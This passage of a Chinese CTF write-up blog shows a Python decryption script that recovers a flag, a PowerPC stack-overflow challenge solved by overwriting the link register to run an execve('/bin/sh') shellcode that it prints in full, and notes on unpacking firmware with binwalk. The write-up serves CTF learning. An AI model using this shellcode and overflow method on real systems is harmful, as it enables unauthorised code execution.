<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_bytes_hex</span>(<span class="params">data</span>):</span></span><br><span class="line">    lin = [<span class="string">&#x27;%0x&#x27;</span> % i <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(lin))</span><br><span class="line"></span><br><span class="line">magic = <span class="string">&#x27;OVMF_And_Easy_Bios&#x27;</span></span><br><span class="line">demo = [<span class="number">0x46</span>, <span class="number">0x77</span>, <span class="number">0x74</span>, <span class="number">0xb0</span>, <span class="number">0x27</span>, <span class="number">0x8e</span>, <span class="number">0x8f</span>, <span class="number">0x5b</span>, <span class="number">0xe9</span>, <span class="number">0xd8</span>, <span class="number">0x46</span>, <span class="number">0x9c</span>, <span class="number">0x72</span>, <span class="number">0xe7</span>, <span class="number">0x2f</span>, <span class="number">0x5e</span>]</span><br><span class="line">v13 = [<span class="number">0</span>]*<span class="number">514</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v13[i] = i</span><br><span class="line">    v13[i+<span class="number">256</span>] = <span class="built_in">ord</span>(magic[i%<span class="number">18</span>])</span><br><span class="line"></span><br><span class="line">v2 = <span class="number">0</span></span><br><span class="line">v3 = <span class="number">0</span></span><br><span class="line">new_list = []</span><br><span class="line"><span class="keyword">while</span> v2!=<span class="number">256</span>:</span><br><span class="line">    v4 = v13[v2]</span><br><span class="line">    v3 = (v13[v2 + <span class="number">256</span>] + v4 + v3) % <span class="number">256</span></span><br><span class="line">    v5 = v13[v3]</span><br><span class="line">    v13[v3] = v4</span><br><span class="line">    v13[v2] = v5</span><br><span class="line">    v2+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line">v7 = <span class="number">0</span></span><br><span class="line">v8 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> v6 != <span class="number">16</span>:</span><br><span class="line">    v8 = v8 + <span class="number">1</span></span><br><span class="line">    v9 = v13[v8]</span><br><span class="line">    v10 = (v9 + v7) % <span class="number">256</span></span><br><span class="line">    v11 = v13[v10]</span><br><span class="line">    v13[v10] = v9</span><br><span class="line">    v7 = (v9 + v7) % <span class="number">256</span></span><br><span class="line">    v13[v8] = v11</span><br><span class="line">    result = v13[(v11 + v13[v10]) % <span class="number">256</span>]</span><br><span class="line">    new_list.append(result)</span><br><span class="line">    <span class="comment">#(v0 + v6) ^= result</span></span><br><span class="line">    v6 += <span class="number">1</span></span><br><span class="line"><span class="comment">#print len(demo)</span></span><br><span class="line"><span class="comment">#print len(new_list)</span></span><br><span class="line">flag_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    flag_list.append(new_list[i]^demo[i])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(new_list[i]^demo[i]))</span><br><span class="line">print_bytes_hex(flag_list)</span><br><span class="line"><span class="comment">#flag&#123;88baec0b5154f859b5851097bb567f5c&#125;</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="6-PPPPPPC"   >
          <a href="#6-PPPPPPC" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-PPPPPPC" class="headerlink" title="6.PPPPPPC"></a>6.PPPPPPC</h2>
      
        <h3 id="1-调试"   >
          <a href="#1-调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-调试" class="headerlink" title="(1)调试"></a>(1)调试</h3>
      <p>powerpc大端架构</p>
<p>调试发现栈溢出，读入0x320，并且变量偏移在0x140，可覆盖$lr寄存器，控制程序流，保护都没开，就尝试ret2shellcode</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201949396.png" alt="image-20220120194956344"></p>

        <h3 id="2-泄露地址"   >
          <a href="#2-泄露地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-泄露地址" class="headerlink" title="(2)泄露地址"></a>(2)泄露地址</h3>
      <p>使用题目给的<code>qemu-ppc-static</code>来运行会使得程序打印所有寄存器的值，远程也是这样的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201953531.png" alt="image-20220120195324259"></p>
<p>参照如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201955804.png" alt="image-20220120195537738"></p>
<p>远程肯定也是qemu，地址不会改变，那么就可以获得栈地址，同时依据调试数据也能得到我们输入数据的相应的偏移</p>

        <h3 id="3-寻找shellcode"   >
          <a href="#3-寻找shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-寻找shellcode" class="headerlink" title="(3)寻找shellcode"></a>(3)寻找shellcode</h3>
      <p>直接去<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/" >shell-storm | Shellcodes Database</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>找对应的shellcode</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x7c\x3f\x0b\x78&quot;	/*mr	r31,r1*/</span><br><span class="line">&quot;\x7c\xa5\x2a\x79&quot;	/*xor.	r5,r5,r5*/</span><br><span class="line">&quot;\x42\x40\xff\xf9&quot;	/*bdzl+	10000454&lt; main&gt;*/</span><br><span class="line">&quot;\x7f\x08\x02\xa6&quot;	/*mflr	r24*/</span><br><span class="line">&quot;\x3b\x18\x01\x34&quot;	/*addi	r24,r24,308*/</span><br><span class="line">&quot;\x98\xb8\xfe\xfb&quot;	/*stb	r5,-261(r24)*/</span><br><span class="line">&quot;\x38\x78\xfe\xf4&quot;	/*addi	r3,r24,-268*/</span><br><span class="line">&quot;\x90\x61\xff\xf8&quot;	/*stw	r3,-8(r1)*/</span><br><span class="line">&quot;\x38\x81\xff\xf8&quot;	/*addi	r4,r1,-8*/</span><br><span class="line">&quot;\x90\xa1\xff\xfc&quot;	/*stw	r5,-4(r1)*/</span><br><span class="line">&quot;\x3b\xc0\x01\x60&quot;	/*li	r30,352*/</span><br><span class="line">&quot;\x7f\xc0\x2e\x70&quot;	/*srawi	r0,r30,5*/</span><br><span class="line">&quot;\x44\xde\xad\xf2&quot;	/*.long	0x44deadf2*/</span><br><span class="line">&quot;/bin/shZ&quot;; // the last byte becomes NULL</span><br></pre></td></tr></table></div></figure>

<p>对应偏移找到即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201202003613.png" alt="image-20220120200332572"></p>
<p>覆盖LR寄存器为该地址完事</p>

        <h2 id="7-easymsg"   >
          <a href="#7-easymsg" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-easymsg" class="headerlink" title="7.easymsg"></a>7.easymsg</h2>
      <p>没看懂</p>

        <h1 id="二、知识点"   >
          <a href="#二、知识点" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、知识点" class="headerlink" title="二、知识点"></a>二、知识点</h1>
      
        <h2 id="1-固件解包-1"   >
          <a href="#1-固件解包-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-固件解包-1" class="headerlink" title="1.固件解包"></a>1.固件解包</h2>
      
        <h3 id="1-binwalk"   >
          <a href="#1-binwalk" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-binwalk" class="headerlink" title="(1)binwalk"></a>(1)binwalk</h3>
      <p>常用的命令</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me xxx.bin  <span class="comment">#解包</span></span><br><span class="line">binwalk -A xxx.bin <span class="comment">#查看架构</span></span><br></pre></td></tr></table></div></figure>

<p>有时候可以用mount挂载binwalk打不开的固件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount ./rootfs.img test</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-固件加解密"   >
          <a href="#2-固件加解密" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-固件加解密" class="headerlink" title="2.固件加解密"></a>2.固件加解密</h2>
      
        <h3 id="1-判断加密"   >
          <a href="#1-判断加密" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-判断加密" class="headerlink" title="(1)判断加密"></a>(1)判断加密</h3>
      <p>有时候固件可能会被加密，可用binwalk的熵计算来判断，压缩或者加密的数据具有较高的熵值</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -E xxx.bin</span><br></pre></td></tr></table></div></figure>

<p>未加密的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211850770.png" alt="image-20220121185003706"></p>
<p>加密的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211850841.png" alt="image-20220121185022780"></p>

        <h3 id="2-解密常见方法"   >
          <a href="#2-解密常见方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-解密常见方法" class="headerlink" title="(2)解密常见方法"></a>(2)解密常见方法</h3>
      <p>逆向，自己寻找等等</p>

        <h2 id="3-固件寻找"   >
          <a href="#3-固件寻找" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-固件寻找" class="headerlink" title="3.固件寻找"></a>3.固件寻找</h2>
      <p>网上，官网啥的，或者硬件提取，反正到时候再看一遍把，服务器，吾爱破解…</p>
<p>观察以下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211856001.png" alt="image-20220121185648863"></p>
</div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/3/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">133</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">83</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">73</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>